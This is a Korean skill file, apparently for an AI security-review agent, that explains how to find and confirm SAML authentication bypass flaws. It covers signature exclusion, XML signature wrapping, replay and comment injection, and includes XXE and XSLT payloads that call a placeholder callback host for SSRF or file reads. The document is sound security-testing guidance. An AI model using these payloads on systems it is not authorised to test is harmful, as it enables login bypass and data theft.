---
grep_patterns:
  - "saml"
  - "SAML"
  - "omniauth-saml"
  - "ruby-saml"
  - "passport-saml"
  - "python-saml"
  - "onelogin"
  - "SAMLResponse"
  - "ds:Signature"
  - "ACS"
---

# SAML Scanner

소스코드 분석으로 SAML 인증 처리의 취약점 후보를 식별한 뒤, 동적 테스트로 실제로 SAML Response를 조작하여 인증을 우회할 수 있는지 검증하여 확인된 취약점만 보고하는 스킬이다.

## 핵심 원칙: "변조된 SAML Response로 인증이 우회되지 않으면 취약점이 아니다"

SAML을 사용한다고 바로 취약점으로 보고하지 않는다. 실제로 SAML Response의 서명을 제거하거나, Assertion을 변조하거나, XML 서명 래핑 공격을 수행하여 다른 사용자로 인증이 되는 것을 확인해야 취약점이다.

## SAML 인증 우회 취약점의 유형

### 서명 제거 공격 (Signature Exclusion)
SAML Response와 Assertion에서 `<ds:Signature>` 요소를 완전히 제거한 뒤, Assertion의 속성값(name, email, id 등)을 변조하여 전송하는 공격. SP(Service Provider)가 서명 존재 여부를 검증하지 않으면 변조된 Assertion이 수락된다.

**공격 절차:**
1. 정상 SAML Response를 캡처 (Base64 디코딩)
2. Response와 Assertion에서 `<ds:Signature>...</ds:Signature>` 블록 전체 제거
3. Assertion 내 속성값 변조 (예: name을 `admin`으로, email을 `admin@target.com`으로)
4. 변조된 Response를 Base64 인코딩하여 ACS 엔드포인트에 전송

### XML 서명 래핑 공격 (XML Signature Wrapping / XSW)
서명된 원본 Assertion은 그대로 두고, 변조된 새 Assertion을 Response에 추가하는 공격. SP가 서명 검증은 원본 Assertion에 대해 수행하지만, 속성값은 변조된 Assertion에서 읽으면 인증이 우회된다.

**공격 절차:**
1. 정상 SAML Response를 캡처 (Base64 디코딩)
2. 변조된 Assertion을 새로 생성 (ID를 `_evilID` 등으로 변경, 속성값 변조)
3. 변조된 Assertion을 Response의 **첫 번째** Assertion으로 삽입
4. 서명된 원본 Assertion은 두 번째로 유지
5. SP가 첫 번째 Assertion을 처리하면 인증 우회

**XSW 변형:**
- XSW1: 변조된 Assertion을 Response 최상위에 삽입
- XSW2: 변조된 Assertion을 서명된 Assertion 앞에 삽입
- XSW3: 서명된 Assertion을 다른 위치로 이동
- XSW4~8: 다양한 위치에 변조 Assertion 삽입

### Assertion 속성 변조 (서명 범위 제한)
Response 전체에만 서명이 있고 Assertion에는 서명이 없는 경우, 또는 서명의 `Reference URI`가 Response만 가리키고 Assertion은 포함하지 않는 경우, Assertion 내부 속성값을 변조할 수 있다.

### SAML Response Replay
이전에 사용된 SAML Response를 재전송하는 공격. `InResponseTo` 검증, `NotOnOrAfter` 시간 검증이 없으면 재사용 가능.

### Comment Injection
XML 주석(`<!-- -->`)을 NameID나 속성값에 삽입하여 서명 검증은 통과하면서 SP가 다른 값으로 해석하도록 하는 공격. 일부 XML 파서의 텍스트 추출 방식 차이를 이용.

```xml
<!-- 서명 검증 시: "admin@evil.com" -->
<!-- SP 파서 해석 시: "admin" (주석 앞 부분만 사용) -->
<saml:NameID>admin<!-- comment -->@evil.com</saml:NameID>
```

### XXE via SAML
SAML Response XML에 DOCTYPE/ENTITY 선언을 삽입하여 SP의 XML 파서에서 파일 읽기나 SSRF를 유발하는 공격.

**공격 벡터:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://CALLBACK_URL/xxe-saml"> %xxe; ]>
<samlp:Response>
    [...]
</samlp:Response>
```

### XSLT via SAML
SAML Response의 `<ds:Transforms>` 내에 XSLT 스타일시트를 삽입하여 서명 검증 과정에서 XSLT 변환이 실행되도록 하는 공격. XML 서명 검증 시 `<ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">` 알고리즘이 허용되면 XSLT 코드가 실행된다.

**공격 벡터:**
```xml
<ds:Transforms>
    <ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">
      <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
        <xsl:template match="/">
          <xsl:copy-of select="document('http://CALLBACK_URL/xslt-saml')"/>
        </xsl:template>
      </xsl:stylesheet>
    </ds:Transform>
</ds:Transforms>
```

이 공격은 서명 검증 로직 자체에서 XSLT 변환을 허용하는 경우에 발생하며, `document()` 함수로 SSRF를 유발하거나 로컬 파일을 읽을 수 있다.

## 분석 프로세스

이 스캐너의 분석은 두 단계로 구성된다:

1. **Phase 1 (소스코드 분석)**: `phase1.md` 참조
2. **Phase 2 (동적 테스트)**: `phase2.md` 참조

